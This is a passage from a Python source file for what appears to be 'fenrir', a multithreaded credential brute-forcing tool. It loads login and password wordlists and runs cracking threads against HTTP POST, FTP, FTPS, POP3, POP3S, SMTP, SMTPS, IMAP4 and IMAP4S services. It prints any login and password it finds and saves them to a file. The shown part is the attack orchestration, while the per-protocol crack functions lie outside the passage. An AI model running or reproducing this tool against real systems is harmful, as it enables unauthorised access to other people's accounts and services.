            wordlist = intertool_wordlists([options['login_wordlist'], options['password_wordlist']])


        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_http_post, args=(options, wordlist)))

        for t in thread_working:

            t.start()


        try:

            while stop_all_thread == False:

                continue

            if found_credentials['login'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                cprint(f"[FOUND] LOGIN: {found_credentials['login']} PASSWORD: {found_credentials['password']}", 'green')
                
                if options['output_file'] != None:

                    append_output(credentials=found_credentials, options=options)


        except KeyboardInterrupt:

            stop_all_thread = True
            for t in thread_working:
                try:
                    t.join()
                except KeyboardInterrupt:
                    continue

            exit()

        exit()

    elif options['protocol'] == 'ftp':

        thread_working = []

        wordlist = queue.Queue()

        if check_type_crack() == 'crack_password':

            wordlist = load_wordlist(options['password_wordlist'])

        elif check_type_crack() == 'crack_login':

            wordlist = load_wordlist(options['login_wordlist'])


        elif check_type_crack() == 'full_crack':

            wordlist = intertool_wordlists([options['login_wordlist'], options['password_wordlist']])

            print('oi')


        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_ftp, args=(options, wordlist)))

        for t in thread_working:

            t.start()


        try:

            while stop_all_thread == False:

                continue

            if found_credentials['login'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                cprint(f"[FOUND] LOGIN: {found_credentials['login']} PASSWORD: {found_credentials['password']}", 'green')
                
                if options['output_file'] != None:

                    append_output(credentials=found_credentials, options=options)


        except KeyboardInterrupt:

            stop_all_thread = True
            for t in thread_working:
                try:
                    t.join()
                except KeyboardInterrupt:
                    continue

            exit()

        exit()

    elif options['protocol'] == 'ftps':

        thread_working = []

        wordlist = queue.Queue()

        if check_type_crack() == 'crack_password':

            wordlist = load_wordlist(options['password_wordlist'])

        elif check_type_crack() == 'crack_login':

            wordlist = load_wordlist(options['login_wordlist'])


        elif check_type_crack() == 'full_crack':

            wordlist = intertool_wordlists([options['login_wordlist'], options['password_wordlist']])


        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_ftps, args=(options, wordlist)))

        for t in thread_working:

            t.start()


        try:

            while stop_all_thread == False:

                continue

            if found_credentials['login'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                cprint(f"[FOUND] LOGIN: {found_credentials['login']} PASSWORD: {found_credentials['password']}", 'green')
                
                if options['output_file'] != None:

                    append_output(credentials=found_credentials, options=options)


        except KeyboardInterrupt:

            stop_all_thread = True
            for t in thread_working:
                try:
                    t.join()
                except KeyboardInterrupt:
                    continue

            exit()

        exit()

    elif options['protocol'] == 'pop3':

        thread_working = []

        wordlist = queue.Queue()

        if check_type_crack() == 'crack_password':

            wordlist = load_wordlist(options['password_wordlist'])

        elif check_type_crack() == 'crack_login':

            wordlist = load_wordlist(options['login_wordlist'])


        elif check_type_crack() == 'full_crack':

            wordlist = intertool_wordlists([options['login_wordlist'], options['password_wordlist']])


        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_pop3, args=(options, wordlist)))

        for t in thread_working:

            t.start()


        try:

            while stop_all_thread == False:

                continue

            if found_credentials['login'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                cprint(f"[FOUND] LOGIN: {found_credentials['login']} PASSWORD: {found_credentials['password']}", 'green')
                
                if options['output_file'] != None:

                    append_output(credentials=found_credentials, options=options)


        except KeyboardInterrupt:

            stop_all_thread = True
            for t in thread_working:
                try:
                    t.join()
                except KeyboardInterrupt:
                    continue

            exit()

        exit()

    elif options['protocol'] == 'pop3s':

        thread_working = []

        wordlist = queue.Queue()

        if check_type_crack() == 'crack_password':

            wordlist = load_wordlist(options['password_wordlist'])

        elif check_type_crack() == 'crack_login':

            wordlist = load_wordlist(options['login_wordlist'])


        elif check_type_crack() == 'full_crack':

            wordlist = intertool_wordlists([options['login_wordlist'], options['password_wordlist']])


        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_pop3s, args=(options, wordlist)))

        for t in thread_working:

            t.start()


        try:

            while stop_all_thread == False:

                continue

            if found_credentials['login'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                cprint(f"[FOUND] LOGIN: {found_credentials['login']} PASSWORD: {found_credentials['password']}", 'green')
                
                if options['output_file'] != None:

                    append_output(credentials=found_credentials, options=options)


        except KeyboardInterrupt:

            stop_all_thread = True
            for t in thread_working:
                try:
                    t.join()
                except KeyboardInterrupt:
                    continue

            exit()

        exit()

    elif options['protocol'] == 'smtp':

        thread_working = []

        wordlist = queue.Queue()

        if check_type_crack() == 'crack_password':

            wordlist = load_wordlist(options['password_wordlist'])

        elif check_type_crack() == 'crack_login':

            wordlist = load_wordlist(options['login_wordlist'])


        elif check_type_crack() == 'full_crack':

            wordlist = intertool_wordlists([options['login_wordlist'], options['password_wordlist']])


        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_smtp, args=(options, wordlist)))

        for t in thread_working:

            t.start()


        try:

            while stop_all_thread == False:

                continue

            if found_credentials['login'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                cprint(f"[FOUND] LOGIN: {found_credentials['login']} PASSWORD: {found_credentials['password']}", 'green')
                
                if options['output_file'] != None:

                    append_output(credentials=found_credentials, options=options)


        except KeyboardInterrupt:

            stop_all_thread = True
            for t in thread_working:
                try:
                    t.join()
                except KeyboardInterrupt:
                    continue

            exit()

        exit()

    elif options['protocol'] == 'smtps':

        thread_working = []

        wordlist = queue.Queue()

        if check_type_crack() == 'crack_password':

            wordlist = load_wordlist(options['password_wordlist'])

        elif check_type_crack() == 'crack_login':

            wordlist = load_wordlist(options['login_wordlist'])


        elif check_type_crack() == 'full_crack':

            wordlist = intertool_wordlists([options['login_wordlist'], options['password_wordlist']])


        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_smtps, args=(options, wordlist)))

        for t in thread_working:

            t.start()


        try:

            while stop_all_thread == False:

                continue

            if found_credentials['login'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                cprint(f"[FOUND] LOGIN: {found_credentials['login']} PASSWORD: {found_credentials['password']}", 'green')
                
                if options['output_file'] != None:

                    append_output(credentials=found_credentials, options=options)


        except KeyboardInterrupt:

            stop_all_thread = True
            for t in thread_working:
                try:
                    t.join()
                except KeyboardInterrupt:
                    continue

            exit()

        exit()

    elif options['protocol'] == 'imap4':

        thread_working = []

        wordlist = queue.Queue()

        if check_type_crack() == 'crack_password':

            wordlist = load_wordlist(options['password_wordlist'])

        elif check_type_crack() == 'crack_login':

            wordlist = load_wordlist(options['login_wordlist'])


        elif check_type_crack() == 'full_crack':

            wordlist = intertool_wordlists([options['login_wordlist'], options['password_wordlist']])


        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_imap4, args=(options, wordlist)))

        for t in thread_working:

            t.start()


        try:

            while stop_all_thread == False:

                continue

            if found_credentials['login'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                cprint(f"[FOUND] LOGIN: {found_credentials['login']} PASSWORD: {found_credentials['password']}", 'green')
                
                if options['output_file'] != None:

                    append_output(credentials=found_credentials, options=options)


        except KeyboardInterrupt:

            stop_all_thread = True
            for t in thread_working:
                try:
                    t.join()
                except KeyboardInterrupt:
                    continue

            exit()

        exit()

    elif options['protocol'] == 'imap4s':

        thread_working = []

        wordlist = queue.Queue()

        if check_type_crack() == 'crack_password':

            wordlist = load_wordlist(options['password_wordlist'])

        elif check_type_crack() == 'crack_login':

            wordlist = load_wordlist(options['login_wordlist'])


        elif check_type_crack() == 'full_crack':

            wordlist = intertool_wordlists([options['login_wordlist'], options['password_wordlist']])


        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_imap4s, args=(options, wordlist)))

        for t in thread_working:

            t.start()


        try:

            while stop_all_thread == False:

                continue

            if found_credentials['login'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                cprint(f"[FOUND] LOGIN: {found_credentials['login']} PASSWORD: {found_credentials['password']}", 'green')
                
                if options['output_file'] != None:

                    append_output(credentials=found_credentials, options=options)


        except KeyboardInterrupt:

            stop_all_thread = True
            for t in thread_working:
                try:
                    t.join()
                except KeyboardInterrupt:
                    continue

            exit()

        exit()

    else:

        error_msg = "[ERROR] Protocol not supported"
        error_message()


if __name__ == '__main__':

    logo()

    options = parse_options(sys.argv)

    if len(sys.argv) < 5:

        help_message()

    fenrir(options)

